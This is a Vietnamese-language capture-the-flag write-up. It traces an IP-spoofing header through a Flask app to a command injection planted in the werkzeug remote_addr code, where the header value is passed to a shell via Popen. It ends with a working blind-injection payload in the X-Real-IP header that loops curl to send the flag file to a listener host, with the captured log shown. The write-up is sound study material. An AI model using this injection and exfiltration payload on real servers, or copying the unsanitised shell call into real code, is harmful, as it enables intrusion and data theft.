---
title: "Matesctf final 2 - IP Spoofing to RCE in flask"
date: 2018-09-08T09:46:55+07:00
draft: false
comments: true
author: "Kev"
tags: ["ctf", "flask"]
Archives: '2018'
autoThumbnailImage: false
thumbnailImagePosition: top
thumbnailImage: ''
coverImage: /images/uploads/ex50.PNG
---

## EXPLOIT - [source](/resources/matesctf/ex50.tar)
<hr>
Sau khoảng thời gian dài nghiên cứu và nhờ sự gợi ý hết sức nhiệt tình từ tác giả tôi đã có thể exploit được lỗi được tác giả cho là khó phát hiện nhất. Chuẩn luôn, là rất khó phát hiện vì code lỗi ở tận trong lib của flask.

Đầu tiên, khi truy cập vào trang đăng nhập tác giả có gợi ý cho mọi người biết là app có handle real ip của client. (Hình trên)
Thế nên mình tìm kiếm trong source để tìm xem có vấn đề bảo mật gì có thể khai thác được không.

{{<highlight python>}}
def index():
    try:
        data = Novel.find_one({"page":1})
        lines = data['content'].split("\n")
    except Exception, e:
        return render_template('index.html', page=0, message=[], _id="")
        print e
    if session.has_key('usn'):
        return render_template('index.html',_id=data['_id'],message=lines,page=1)
    return render_template('login.html',ip=request.remote_addr)

{{</highlight>}}

Chính là chỗ này, tác giả đã lấy `remote_addr` để hiển thị ra trang chủ. Thêm nữa, `remote_addr` còn được insert vào database lúc tạo user, ngoài ra thì không được dùng để làm gì nữa.
Có 2 vector tấn công mà mình có thể nghĩ đến đó là: nosql injection và xss

Tuy nghiên, giả sử bị lỗi nosql injection thì tội gì phải inject vào trường ip mà không inject vào trường username, hay name. Mặc khác, query ở đây là câu lệnh insert nên có vẻ khó để khai thác. XSS lại càng không, vì mình không tìm thấy flag nào trong cookie của bot, nếu có session của bot thì cũng không lấy được flag. Thế là 2 vector này xem như bỏ.

Mình có test thêm một số cách nữa, là thay đổi giá trị của trường `X-Forwarded-For` để fake ip. và kết quả là:

{{<highlight bash>}}
# Truy cập từ localhost. Kết quả nhận được giá trị 127.0.0.1
✔ curl localhost:8080  
<input type="submit" class="btn waves-effect waves-light" value="127.0.0.1"/>

# Thay đổi request header bằng giá trị ngẫu nghiên. Kết quả bị lỗi
✔ curl localhost:8080 -H "X-Forwarded-For: 1.2.3.4"
{
  "error": {
    "code": 500, 
    "message": "fake ip"
  }
}

# Thay đổi giá trị request header là ip thật. Kết quả trả về đúng với những gì gửi lên
✔ curl localhost:8080 -H "X-Forwarded-For: 103.92.28.200" 
<input type="submit" class="btn waves-effect waves-light" value="103.92.28.200"/>

# Truy cập từ internet. Kết quả nhận được là ip thật của client
✔ curl 103.92.28.200
<input type="submit" class="btn waves-effect waves-light" value="58.187.170.100"/>

# Thay đổi request header bằng giá trị 127.0.0.1. Kết quả không thay đổi
✔ curl 103.92.28.200 -H "X-Forwared-For: 127.0.0.1"
<input type="submit" class="btn waves-effect waves-light" value="58.187.170.100"/>
{{</highlight>}}

Tại sao lại có sự khác biệt giữa internal và external? {{< emoji oh >}} Ở trung gian giữa 2 môi trường thì chỉ có reverse proxy tác động vào thôi. Kiểm tra cấu hình nginx tại `/etc/nginx/sites-enabled/default`

```
server {
	listen 80 default_server;
	listen [::]:80 default_server;
	server_name _;

	location / {
		proxy_set_header X-Forwarded-For $remote_addr;
		proxy_pass http://127.0.0.1:8080/;
	}
}
```

Thì ra nginx đã set lại giá trị của X-Forwarded-For. Mình tìm kiếm thêm một số thông tin về cách khai thác theo hướng này. Có vẻ cách cấu hình của nginx và flask đều bị sai và có thể khai thác được lỗi này. Nhưng mình chưa hiểu vì sao mà không thực hiện ip spoofing được khi qua nginx. Nhưng đều đó không quan trọng, vì nếu attack được vector này thì làm sao get flag?

- [Flask apps on Heroku susceptible to IP spoofing](http://esd.io/blog/flask-apps-heroku-real-ip-spoofing.html)
- [Nginx is more explicit](https://stackoverflow.com/questions/12770950/flask-request-remote-addr-is-wrong-on-webfaction-and-not-showing-real-user-ip)

Mình phải xin hint của tác giả, được gợi ý là tìm vị trí implement `request.remote_addr` trong lib. Thực hiện trace từ từ như bên dưới:

{{<highlight bash>}}
# Để tìm được vị trí của thư viện flask ta có thể dùng lệnh đơn giản sau
✔ python -c "import flask; print flask.__file__"
/usr/local/lib/python2.7/dist-packages/flask/__init__.pyc

# Đối tượng request được gọi từ file globals.py
✔ cat /usr/local/lib/python2.7/dist-packages/flask/__init__.py | grep request
from .globals import current_app, g, request

# Đối tượng request được khởi tạo từ method LocalProxy
✔ cat /usr/local/lib/python2.7/dist-packages/flask/globals.py | grep request 
request = LocalProxy(partial(_lookup_req_object, 'request'))

# Tìm vị trí của method LocalProxy, kết quả là tại werkzeug.local
✔ cat /usr/local/lib/python2.7/dist-packages/flask/globals.py | grep LocalProxy
from werkzeug.local import LocalStack, LocalProxy

# Tìm vị trí của thư viện werkzeug
✔ python -c "import werkzeug; print werkzeug.__file__"
/usr/local/lib/python2.7/dist-packages/werkzeug/__init__.pyc 

# Đối tượng ta đang tìm kiếm được gán vào _LocalProxy__local và __wrapped__
✔ cat /usr/local/lib/python2.7/dist-packages/werkzeug/local.py
class LocalProxy(object):
	def __init__(self, local, name=None):
	    object.__setattr__(self, '_LocalProxy__local', local)
	    object.__setattr__(self, '__name__', name)
	    if callable(local) and not hasattr(local, '__release_local__'):
	        object.__setattr__(self, '__wrapped__', local)
{{</highlight>}}

Cũng hơi lòng vòng. Thực ra request được kết thừa từ class `BaseRequest` trong `wrappers.py`. Và remote_addr cũng được implement tại đây
{{<highlight python3>}}
@property
def remote_addr(self):
    if self.headers.has_key('X-Real-IP'):
        ip = self.headers.get('X-Real-IP')
    elif self.headers.has_key('X-Forwarded-For'):
        ip = self.headers.get('X-Forwarded-For')
    else:
        ip = self.environ.get('REMOTE_ADDR')
    cmd = 'netstat -tn | grep ' + ip 
    import subprocess
    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    output = ps.communicate()[0]
    if len(output) > 0: 
        return ip
    raise Exception("fake ip") 
{{</highlight>}}

Đây rồi, command injection. `ip` có thể được custom từ trường `X-Real-IP` hoặc `X-Forwarded-For` và gọi `Popen`. Vì kết quả chỉ được hiển thị ra `ip` không phải `output` - dạng blind - nên cần phải bắt dữ liệu từ server khác. Mình viết script dùng curl gửi dữ liệu kèm theo flag, mỗi 1 phút sẽ tự động gửi flag qua 1 lần.

{{<highlight bash>}}
# Script đọc flag mỗi 1 phút
✔ curl 103.92.28.200 -H "X-Real-IP: 127.0.0.1; while true; do curl 103.92.28.200:8000/?flag=`cat /home/ctf/ex50/flag`; sleep 60; done;"

# Bắt gói tin HTTP 
✔ php -S 103.92.28.200:8000
[Mon Sep 10 11:46:10 2018] ::1:44454 [404]: /?flag=matesctf23w4324234234234234 - No such file or directory
[Mon Sep 10 11:47:10 2018] ::1:44456 [404]: /?flag=matesctf23w4324234234234234 - No such file or directory
[Mon Sep 10 11:48:10 2018] ::1:44458 [404]: /?flag=matesctf23w4324234234234234 - No such file or directory
[Mon Sep 10 11:49:10 2018] ::1:44460 [404]: /?flag=matesctf23w4324234234234234 - No such file or directory
[Mon Sep 10 11:50:10 2018] ::1:44462 [404]: /?flag=matesctf23w4324234234234234 - No such file or directory
{{</highlight>}}


## SOLUTIONS
<hr>
To be continue ...
